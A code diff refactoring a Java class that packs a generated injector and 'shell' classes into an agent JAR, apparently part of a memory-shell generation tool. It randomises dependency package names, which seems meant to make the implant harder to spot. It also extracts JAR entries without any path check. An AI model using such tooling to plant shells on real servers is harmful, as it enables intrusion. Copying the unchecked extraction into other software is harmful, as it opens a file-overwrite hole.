@@ -1,6 +1,7 @@
 package com.reajason.javaweb.memshell.packer.jar;
 
 import com.reajason.javaweb.asm.ClassRenameUtils;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GenerateResult;
 import com.reajason.javaweb.memshell.utils.CommonUtil;
 import lombok.SneakyThrows;
@@ -17,74 +18,94 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Enumeration;
 import java.util.Map;
-import java.util.jar.JarEntry;
-import java.util.jar.JarFile;
-import java.util.jar.JarOutputStream;
-import java.util.jar.Manifest;
+import java.util.jar.*;
 
 /**
  * @author ReaJason
  * @since 2025/1/1
  */
 public class AgentJarPacker implements JarPacker {
-
-    static Path tempBootPath;
+    private static Path tempBootPath;
 
     @Override
     @SneakyThrows
     public byte[] packBytes(GenerateResult generateResult) {
-        String mainClass = generateResult.getInjectorClassName();
-        String advisorClass = generateResult.getShellClassName();
+        Manifest manifest = createManifest(generateResult.getInjectorClassName());
+        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 
-        Manifest manifest = new Manifest();
-        manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
-        manifest.getMainAttributes().putValue("Agent-Class", mainClass);
-        manifest.getMainAttributes().putValue("Premain-Class", mainClass);
-        manifest.getMainAttributes().putValue("Can-Redefine-Classes", "true");
-        manifest.getMainAttributes().putValue("Can-Retransform-Classes", "true");
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        String relocatePrefix = CommonUtil.getRandomPackageName().replace(".", "/") + "/";
+        boolean isAsm = generateResult.getShellConfig().getShellType().endsWith(ShellType.ASM);
 
-        String RELOCATE_PREFIX = CommonUtil.getRandomPackageName().replace(".", "/") + "/";
-        boolean RELOCATE_ENABLED = true;
-
-        try (JarOutputStream targetJar = new JarOutputStream(byteArrayOutputStream, manifest)) {
-            String dependencyPackageName = null;
-            if (generateResult.getShellConfig().getShellType().endsWith("ASM")) {
-                dependencyPackageName = Opcodes.class.getPackage().getName();
-                addDependency(targetJar, Opcodes.class, true, RELOCATE_PREFIX);
-            } else {
-                RELOCATE_ENABLED = false;
-                dependencyPackageName = ByteBuddy.class.getPackage().getName();
-                addDependency(targetJar, ByteBuddy.class, false, RELOCATE_PREFIX);
-            }
-
-            byte[] injectorBytes = generateResult.getInjectorBytes();
-            if (RELOCATE_ENABLED) {
-                injectorBytes = ClassRenameUtils.relocateClass(injectorBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
-            }
-            targetJar.putNextEntry(new JarEntry(mainClass.replace('.', '/') + ".class"));
-            targetJar.write(injectorBytes);
-            targetJar.closeEntry();
-
-            byte[] shellBytes = generateResult.getShellBytes();
-            if (RELOCATE_ENABLED) {
-                shellBytes = ClassRenameUtils.relocateClass(shellBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
-            }
-            targetJar.putNextEntry(new JarEntry(advisorClass.replace('.', '/') + ".class"));
-            targetJar.write(shellBytes);
-            targetJar.closeEntry();
-
-            for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
-                targetJar.putNextEntry(new JarEntry(entry.getKey().replace('.', '/') + ".class"));
-                byte[] innerClassBytes = entry.getValue();
-                if (RELOCATE_ENABLED) {
-                    innerClassBytes = ClassRenameUtils.relocateClass(innerClassBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
-                }
-                targetJar.write(innerClassBytes);
-                targetJar.closeEntry();
-            }
+        try (JarOutputStream targetJar = new JarOutputStream(outputStream, manifest)) {
+            addDependencies(targetJar, relocatePrefix, isAsm);
+            addClassesToJar(targetJar, generateResult, relocatePrefix, isAsm);
         }
-        return byteArrayOutputStream.toByteArray();
+
+        return outputStream.toByteArray();
+    }
+
+    private Manifest createManifest(String mainClass) {
+        Manifest manifest = new Manifest();
+        Attributes attributes = manifest.getMainAttributes();
+        attributes.putValue("Manifest-Version", "1.0");
+        attributes.putValue("Agent-Class", mainClass);
+        attributes.putValue("Premain-Class", mainClass);
+        attributes.putValue("Can-Redefine-Classes", "true");
+        attributes.putValue("Can-Retransform-Classes", "true");
+        return manifest;
+    }
+
+    @SneakyThrows
+    private void addDependencies(JarOutputStream targetJar, String relocatePrefix, boolean isAsm) {
+        if (isAsm) {
+            addDependency(targetJar, Opcodes.class, true, relocatePrefix);
+        } else {
+            addDependency(targetJar, ByteBuddy.class, false, relocatePrefix);
+        }
+    }
+
+    @SneakyThrows
+    private void addClassesToJar(JarOutputStream targetJar, GenerateResult generateResult,
+                                 String relocatePrefix, boolean isRelocateEnabled) {
+        String dependencyPackage = isRelocateEnabled ?
+                Opcodes.class.getPackage().getName() : ByteBuddy.class.getPackage().getName();
+
+        // Add injector class
+        addClassEntry(targetJar,
+                generateResult.getInjectorClassName(),
+                generateResult.getInjectorBytes(),
+                dependencyPackage,
+                relocatePrefix,
+                isRelocateEnabled);
+
+        // Add shell class
+        addClassEntry(targetJar,
+                generateResult.getShellClassName(),
+                generateResult.getShellBytes(),
+                dependencyPackage,
+                relocatePrefix,
+                isRelocateEnabled);
+
+        // Add inner classes
+        for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
+            addClassEntry(targetJar,
+                    entry.getKey(),
+                    entry.getValue(),
+                    dependencyPackage,
+                    relocatePrefix,
+                    isRelocateEnabled);
+        }
+    }
+
+    @SneakyThrows
+    private void addClassEntry(JarOutputStream targetJar, String className, byte[] classBytes,
+                               String dependencyPackage, String relocatePrefix, boolean isRelocateEnabled) {
+        targetJar.putNextEntry(new JarEntry(className.replace('.', '/') + ".class"));
+        byte[] processedBytes = isRelocateEnabled ?
+                ClassRenameUtils.relocateClass(classBytes, dependencyPackage, relocatePrefix + dependencyPackage) :
+                classBytes;
+        targetJar.write(processedBytes);
+        targetJar.closeEntry();
     }
 
     @SneakyThrows
@@ -128,27 +149,29 @@ public class AgentJarPacker implements JarPacker {
         sourceJar.close();
     }
 
+    /**
+     * Extracts a JAR file to a temporary directory
+     *
+     * @param jarPath  Path to the source JAR file
+     * @param tempPath Path to the temporary directory
+     */
     @SneakyThrows
     public static void unzip(String jarPath, String tempPath) {
         try (JarFile jarFile = new JarFile(jarPath)) {
             Enumeration<JarEntry> entries = jarFile.entries();
             while (entries.hasMoreElements()) {
                 JarEntry jarEntry = entries.nextElement();
-                String entryName = jarEntry.getName();
-                File file = new File(tempPath, entryName);
+                File targetFile = new File(tempPath, jarEntry.getName());
+
                 if (jarEntry.isDirectory()) {
-                    file.mkdir();
-                } else {
-                    InputStream inputStream = null;
-                    FileOutputStream outputStream = null;
-                    try {
-                        inputStream = jarFile.getInputStream(jarEntry);
-                        outputStream = new FileOutputStream(file);
-                        IOUtils.copy(inputStream, outputStream);
-                    } finally {
-                        IOUtils.closeQuietly(inputStream);
-                        IOUtils.closeQuietly(outputStream);
-                    }
+                    targetFile.mkdirs();
+                    continue;
+                }
+
+                targetFile.getParentFile().mkdirs();
+                try (InputStream inputStream = jarFile.getInputStream(jarEntry);
+                     FileOutputStream outputStream = new FileOutputStream(targetFile)) {
+                    IOUtils.copy(inputStream, outputStream);
                 }
             }
         }
